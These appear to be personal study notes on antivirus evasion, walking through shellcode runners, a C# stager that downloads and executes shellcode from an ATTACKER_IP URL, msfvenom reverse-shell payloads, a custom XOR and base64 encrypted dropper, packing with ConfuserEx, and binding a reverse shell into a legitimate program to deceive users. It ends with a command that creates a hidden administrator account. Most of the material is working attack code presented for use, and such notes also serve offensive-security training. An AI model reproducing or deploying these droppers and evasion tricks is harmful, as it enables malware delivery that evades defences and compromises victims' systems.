# [[Windows Internals#Portable Executable Format|PE]] Structure
Since we will be dealing with packing and unpacking topics, the technique requires details about the PE structure. Also, some [[Antivirus|AV]] software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capabilities, we need to understand the structure of Windows PE files and where malicious shellcode can be stored.
We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:
- Defining the shellcode as a local variable within the main function will store it in the `.TEXT` PE section
- Defining the shellcode as a global variable will store it in the `.Data` section
- Storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the `.rsrc` data section
- We can add a custom data section to store the shellcode.

## [[PE-Bear]]
It helps to check the PE structure: Headers, Sections, etc. It also provides a GUI to show all relevant EXE details.

# Shellcode Basics
Generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly.

--- 


To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this example we will be creating a simple shellcode for linux that writes "Bye World".
The following assembly code uses two main functions:
- `sys_write` to print out a string we choose
- `sys_exit` to terminate the execution of the program
To call those functions, we will use **syscalls**. This is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and then exit the program. Each **OS has a different** calling convention regarding syscalls. For 64-bits linux, we can call the needed functions from the kernel by setting up the following values

| **rax** | **System Call** | **rdi**         | **rsi**         | **rdx**      |
| ------- | --------------- | --------------- | --------------- | ------------ |
| 0x1     | sys_write       | unsigned int fd | const char *buf | size_t count |
| 0x3c    | sys_exit        | int error_code  |                 |              |
This tells us what values we need to set in different processor registers to call the `sys_write` and `sys_exit` functions using syscalls. For 64-bit linux, the **rax** register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute `sys_write`, and setting rax to 0x3c will make the kernel execute `sys_exit`. Each of the two functions require some parameters to work, which can be set through the **rdi**, **rsi** and **rdx**. A complete reference can be seen [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

For `sys_write` the first parameter sent through **rdi** is the file descriptor to write to. The second in **rsi** is a pointer to the string we want to print, and the third in **rdx** is the size of the string to print.
For `sys_exit` **rdi** needs to be set to the exit code for the program. We will use code 0, meaning the program exited successfully.
```asm
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "Bye World\r\n"
    mov rdx, 0xB
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "Bye world\r\n", is pushed into the stack.
    db "Bye World", 0dh, 0ah
```
Here, we first start by defining our entry point `global _start`, then we specify in which section of the PE this code is going to exist `section .text`. Then we go to the `MESSAGE` label, where we use the `call GOBACK` instruction,indicating that we are going to push the address of the next instruction into the stack, which in this case is `db "ByeWorld", 0dh, 0ah`. Then we would set up the rax with the value `0x1` to use the syscall `sys_write`, we set it to use std output `mov rdi, 0x1`, and then pop the address of our string from the stack and give it to the rsi `pop rsi`. Finally we set the size of our string  `mov rx, 0xB` and call the function `syscall`. We then tell that we are going to use the `sys_exit` function, use exit code 0, and call the function to terminate the program.

Next we compile and link the ASM code to create an x64 linux executable file and finally execute the program
```sh
nasm -f elf64 test.asm
ld test.o -o test
./test
```
We used the `nasm` command to compile the asm file, specifying the `-f elf64` option to indicate we are compiling for 64-bits linux. Notice that as a result we obtain a `.o` file, which contains object code, which needs to be linked in order to be a working executable file. 
Now that we have the compiled ASM program, let's extract the shellcode with the `objdump` command by dumping the `.text` section of the compiled binary.
```sh
objdump -d test
```
Now we need to extract the hex value from that output. To do that, we can use `objcopy` to dump only the `.text` section, in a binary format into a new file called `test.text`.
```shell
objcopy -j .text -O binary test test.text
```
The test.text contains our shellcode in binary format, so to be able to use it, we need to convert it to hex first. The `xxd` command has the `-i` option that will output the binary file in a C string directly
```shell
xxd -i test.text
```
Finally, we've done it, a formatted shellcode from our ASM assembly. To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program
```c
#include <stdio.h>

int main(int argc, char **argv) {
	unsigned char message[] = {
	  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
	  0x5e, 0xba, 0x0b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
	  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
	  0xff, 0x42, 0x79, 0x65, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x0d, 0x0a
	};
    
    (*(void(*)())message)();
    return 0;
}
```
Note that for execution we [[Injection types#Invoking Function Pointers|Invoke function pointers]].
Then, we finally compile this and execute it
```shell
gcc -Wall -z execstack test.c -o testx
./testx
```
Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack.

# Generate Shellcode using Public tools
Shellcode can be generated for a specific format with a particular programming language. This depends on us, if our dropper, the main exe file, contains the shellcode that will be sent to a victim and is written in C, then we need to generate a shellcode format that works with in C.
The advantage of generating shellcode via public tools is that we don't need to craft a custom shellcode from scratch. Most public C2 frameworks provide their own shellcode generator compatible with the C2 platform. Now, pretty convenient but at the **cost of getting detected by the AV**.  Still worth knowing, we can use [[Metasploit|Msfvenom]] to generate a shellcode that executes Windows files, in this case calc.exe
```shell
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
```

## Shellcode from EXE files
Shellcode can also be stored in `.bin` files, which is a raw data format. In this case, we can get the shellcode of it using the `xxd -i` command.
[[C2]] frameworks provide shellcode as a raw binary file `.bin`. If this is the case, we can use the Linux system command `xxd` to ge the hex representation of the binary file. To do so, we execute the following `xxd -i`.

## Shellcode injection
We can [[Injection types|inject]] our shellcode into a running or new thread and process using various techniques. As they modify the program's execution flow to update registers and functions of the program to execute our own code.
We can use the following code to inject our shellcode into memory and execute it.
```c
#include <windows.h>
unsigned char stager[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
int main(){
	DWORD oldProtect;
	VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
	int (*shellcode)() = (int(*)())(void*)stager;
	shellcode();
}
```
Then compiling this
```shell
i686-w64-mingw32-gcc test_calc.c -o test_calc.exe
```
And we have our payload

# Staged payloads
As we now [[C2#Staged|Staged]] payloads are built in halves, one being the stager/dropper and our shell/exploit, so when we execute the former we are going to form a connection to download and execute the latter without the need to have it on the target machine. We can use this to our advantage as our stager doesn't need to be malicious in nature, so it can help us to circumvent AVs. The following is an example of an stager in C#.
```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
///////////Section 1///////////////
	
	// https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	// https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
	
	// https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	
	public static void Main() {
		string url = "https://ATTACKER_IP/shellcode.bin";
		Stager(url);
	}
	
	public static void Stager(string url) {
	///////////Section 2///////////////
		
		WebClient wc = new WebClient();
		ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		
		byte[] shellcode = wc.DownloadData(url);
		
	///////////Section 3///////////////
		
		UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
		
	///////////Section 4///////////////
		
		IntPtr threadHandle = IntPtr.Zero;
		UInt32 threadId = 0;
		IntPtr parameter = IntPtr.Zero;
		threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
		
		WaitForSingleObject(threadHandle, 0xFFFFFFFF);
	}
}
```
Now, we first start with section 1. Here is where we will import some Windows API functions via [[Windows API#P/Invoke|P/Invoke]]. The functions we need are going to be 
- `VirtualAlloc()`: Allows us to reserve some memory to be used by our shellcode.
- `CreateThread()`: Creates a thread as part of the current process.
- `WaitForSingleObject()`: Used for thread synchronization. It allows us to wait for a thread to finish before continuing.
Now, with the `Stager()` function and the section 2. Firstly, we are going to create a new `WebClient()` object that allows us to download the shellcode using web requests. Before making the actual request we will overwrite the `ServerCertificateValidationCallback` method in charge of validating SSL certificates when using HTTPS requests so that the WebClient does not complain about being self-signed or invalid certificates, which we will be using in the web server hosting the payload. After that, we will call the `DownloadData()` method to download the shellcode from the given URL and store it into the `shellcode` variable.
On section 3. Once our shellcode has been downloaded, we will need to copy it into executable memore before actually running it. We use `VirtualAlloc()` to request a memory block from the operating system. Notice that we request enough memory to allocate `shellcode.Length` bytes, and set the `PAGE_EXECUTE_READWRITE` flag, making it assigned memory executable, readable, and writeable. Once our executable memory block is reserved and assigned to the `codeAddr` variable, we use `Marshal.Copy()` to copy the contents of the `shellcode` variable in the `codeAddr`.
Finally, on section 4. Now that we have copied our payload into allocated the memory of an executable block, we use the `CreateThread()` function to spawn a new thread on the current process that will execute our shellcode. The third parameter being the address of the shellcode we just stored in memory, so that when the thread starts, it runs the contents of our shellcode as if it were a regular function. The fifth parameter is set to `0` so that it will start immediately. Once this thread has been created, we will call the `WaitForSingleObject()` function to instruct our current program that it has to wait for thread execution to finish before continuing. This prevents our program from closing before the shellcode thread gets a chance to execute.

We finally compile our code 
```PowerShell
csc staged_payload.cs
```
Then, we need to set up a web server to host the final shellcode. First we generate a shellcode
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=7474 -f raw -o shellcode.bin -b "\x00\x0a\x0d"
```
We use the raw format here as the shellcode will be directly downloaded into memory. 
Now that we have a shellcode, we need to create a self-signed certificate
```sh
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```
Once we have this, we can spawn a simple HTTPS server using python with the following command
```sh
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```
With this, we can now execute our stager payload. The stager should connect to the HTTPS server and retrieve the `shellcode.bin` file to load it into memory and run it on the victim machine. We just set up a reverse listener to receive our shell and that's it.

# Encoding and Encryption
AV vendors implement their AV software to blocklist most public tools using static or dynamic detection techniques. Therefore, without modifying the shellcode generated by these public tools, the detection rate for our dropper is high.
Encoding and encryption can be used in AV evasion techniques where we encode and/or encrypt shellcode used in a dropper to hide it from AV software during the runtime. Also, the two techniques can be used to not only hide the shellcode but also functions, variables, etc.
## Encoding using MSFVenom
Public tools such Metasploit, provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If we try using such features out of the box, chances are our payload will be detected as soon as the files touches the victim's desk.
To prove this, we can try to generate a simple payload with this method. We can list all of the encoders available to msfvenom with the following command
```sh
msfvenom --list encoders
```
We can indicate we want to use an encoder with the `-e` flag and then specify we want to encode the payload a number of times with the `-i` flag
```sh
msfvenom -a x86 --Platform Windows LHOST=tun0 LPORT=7474 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o encoded_shell.exe
```
If we try to run this on a place with a mediocre AV, it will most than likely detect it, so if encoding doesn't work we should try encrypting
## Encrypting using MSFVenom
We can easily generate encrypted payloads using msfvenom. The choices tho, are not many
```sh
msfvenom --list encrypt
```
Let's build an XOR encrypted payload. For this type of algorithm, we will need to specify a key. The command would look as follows
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=7474 -f exe --encrypt xor --encrypt-key "7h1zI5mYK3y" -o xored_shell.exe
```
Once again, if we try this on almost any AV, it will be flagged, as AV vendors have invested lots of time into ensuring simple msfvenom payloads are detected.
## No 5cr1pt K1ddin9
The best way to overcome this is to use our own custom encoding schemes so that the AV doesn't know what to do to analyze our payload. Notice that we don't have to do anything to complex, as long as it is confusing enough for the AV to analyze. As an example we will take a simple reverse shell generated by msfvenom and use a combination of XOR and base64 to try and bypass an AV
Let's start by generating a reverse shell with msfvenom in C#
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=7474 -f csharp
```
Now, before building our actual payload, we will create a program that will take the shellcode generated by msfvenom and encode it in any way we like. In this case, we will be XORing the payload with a custom key first and then encoding it using base64. 
```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "7h1zI5mYk3y!";
            
            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
            
            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };
            
            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```
The code is pretty simple, and will generate an encoded payload that will embed on the final payload. 
Now that our shellcode is encrypted and encoded in base64, we will need to adjust our payload so that it decodes the shellcode before executing it. To match the encoder, we will decode everything in the reverse order we encoded it. So we start by decoding the base64 content, and then continue by XORing the result with the same key we used in the encoder.
```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
	
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	
	private static byte[] xor(byte[] shell, byte[] keyBytes){
		for(int i=0; i<shell.Length; i++){
			shell[i] ^= KeyBytes[i % KeyBytes.Length];
		}
		return shell;
	}
	
	public static void Main() {
		string key = "7h1zI5mYk3y!";
		byte[] keyBytes = Encoding.ASCII.GetBytes(key);
		byte[] encrypted = Convert.FromBase64String("f1n4Msjcq6aUzDGsMofOhbZ91lot0ueG/vHdMnhtShFGy4beyIrFhUdXFw5KapUiccj+nND+0Axl4zXjtnqPGUdfoebqIccCOQLdjcijNhBnn9ZPtsAd1TO1j/yOitTjuITu3EFObAhsg68NrNFWOzOc8i4pKh0icYnnWEDY5hIsArcNtumZ8k/0uv9yScNqjkDuVrQkyVv7n9ZPtsAd1U4VOvPjq1QakfxekYPgpVJo6zbzJqmZ8k/wuv9yzNSpfcHrVsCwyFv9k2yCdrncqU6Msqb8889jKcj2nNrkArYNk7V5HqmcIFWceOxL/WrdjtTmY/ffswUe4OeGv6eU8OmcchICq5UiOABKlDyugUcf2Oqwk7CJMIYwv3dT6y9uBq+oIlXgCLBF0+aG/qicwyZUmP5df8VyPLhmkLFsyaXtmm5Etg4dMYYVskRIpUrCjlznVEfGkRt1nm5ktngkOLVNVorDVUBq8E3v34CsyOJOv4OG/vHdeU6Esq7qI3d1Jt7i7EDGjANsggV6mDaZXVvV8rYv7rE6t4nHlQlK1wpsgqbWv6GUhs+Vo7ddYtirsMUmHMEW+JYSVBhTtsAPMfAeePDjEJ2lbOlQCDtcNPh7k10ga0xAhtqccDqKlpNeewlUPfWpOh0+oIjs/qic8NUrJv6iqpU=");
		byte[] shellcode = xor(encrypted, keyBytes);
		
		UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
		
		IntPtr threadHandle = IntPtr.Zero;
		UInt32 threadId = 0;
		IntPtr parameter = IntPtr.Zero;
		threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
		
		WaitForSingleObject(threadHandle, 0xFFFFFFFF);
	}
```
Now if build this code, and execute it, we could reasonably think that we could get under some radars. Although behavioral detection could still catch us as it is still a reverse TCP connection, the payload itself should be pretty safe. 

# Packers
Another method to defeat disk-based AV detection is to use a packer. **Packer** are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same. Packers do this with two main goals.
- Compress the program so that it takes up less space.
- Protect the program from reverse engineering in general
Packers are commonly used by software developers who would like to protect their software from being reverse engineered or cracked. They achieve some level of protection by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others. And they can also be used to obfuscate malware without much effort.
There's quite a large number of packers out there, including UPX, MPRESS, Themida, etc.
## Packing an Application
While every packer operates differently, let's check a basic examples of what they do.
When an application is packed, it will be transformed in some way using a packing function. the packing function needs to be able to obfuscate and transform the original code of the application in a way that can be reasonably reversed by an unpacking function so that the original functionality of the application is preserved. While sometimes the packer may add some code (to make debugging the application harder, for example), it will generally want to be able to get back the original code we wrote when executing it.
![[Pasted image 20240821032031.png]]
The packed version of the application will contain our packed application code. Since this new packed code is obfuscated, the application needs to be able to unpack the original code from it. To this end, the packer will embed a code stub that contains an unpacker and redirect the main entry point of the executable to it. When our application gets executed the following happens
![[Pasted image 20240821032357.png]]
## Packers and AVs
Now, even though we will be avoiding static detection, by using a packer, making it so the signature from our code no longer matches with any potential one in the AV. We can still run into problems
- While our original code might be transformed into something unrecognizable, the packed executable contains a stub with the unpacker's code. If the unpacker has a known signature, the AV might still flag any packed executable based on the unpacker stub alone.
- At some point, our application will unpack the original code into memory so that it can be executed. If the AV solution we are trying to bypass can do in-memory scans, we might be fucked.
## Packing our shellcode
Parting from a basic C# code, to create a reverse shell
```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
	[DllImport("kernel32")]
	private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
	
	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	
	private static UInt32 MEM_COMMIT = 0x1000;
	private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	
	public static void Main(){
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };
	
	
    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
	
    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
	
    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
	}
}
```
We then compile into an executable and proceed to the packing. We will now use the [[ConfuserEx]] packer to pack our .NET payloads. ConfuserEx will require us to indicate the folders in which it will work. Once the base directory is set up, we need to drag and drop the executable we want to pack on the interface. 
We then go into the setting tab, and select our payload. We hit the "+" button and add a rule, and we also need to enable the compressor on the top.
![[Pasted image 20240821041553.png]]
We then edit the "true" rule, and set it to the maximum preset. Finally we go to the "Protect!" tab and hit "Protect!". And that's it, we have packed our executable.
The new payload should be ready, and stealthier than before.

# Binders
While not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A **binder** is a program that merges two (or more) executables into a single one. It is often used when we want to distribute our payload hidden inside another known program to fool users into believing they are executing a different program.
![[Pasted image 20240821043527.png]]
While every Binder is different, they will basically add the code of our shellcode inside the legitimate program and have it executed somehow.
## Binding with msfvenom
We can easily plant a payload in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently. The method used by msfvenom injects our malicious program by creating an extra thread for it, so it is slightly different from what we mentioned, but functions practically the same. Having a separate thread is even better since the program won't get blocked in case our shellcode fails for some reason.
To create a binder we can use the following
```shell
msfvenom -x Program.exe -k -p windows/shell_reverse_tcp lhost=tun0 lport=7474 -f exe -o EvilProgram.exe
```
The resulting being an exe that will execute a reverse shell without the user noticing it.
## Binders and AV
As we said, Binders won't do much to hide our payload from an AV. As we are simply joining two executables without any changes, so they will still trigger any original signatures that the original payload would have.
Their main use is to fool, and fool we may. So when creating a real payload, we may want to use encoders, encrypters, or packers to hide our shellcode from signature-based AVs, and then bind it into a known executable.

# [[Runtime Detection Evasion|In memory scanning]]
Now, most of the initial phase has been conquered, but if we try to run commands with our reverse shells, the AV might notice it and kill it. This is because AVs will hook certain Windows API calls and do in-memory scanning whenever such API calls are used. And in the case of any shell generated with msfvenom, `CreateProcess()` will be invoked and detected.
## What to do
Some easy things that we can do may be
- **Just wait**: as stupid as it sounds, memory scanning is a hefty operation, so most AV will only do it for a while and then stop.
- **User smaller payloads**: The smaller the payload, the less likely it is to be detected. If we use msfvenom to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it, we can try things like
```sh
msfvenom -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
```
- If getting noticed by humans isn't a problem. We can just run `cmd.exe` from our reverse shell, the AV will detect our payload and kill the associated process, but not the new cmd we just spawned
Now, most will behave differently, but still it's worth knowing the similarities and explore any weird behaviors we may find.
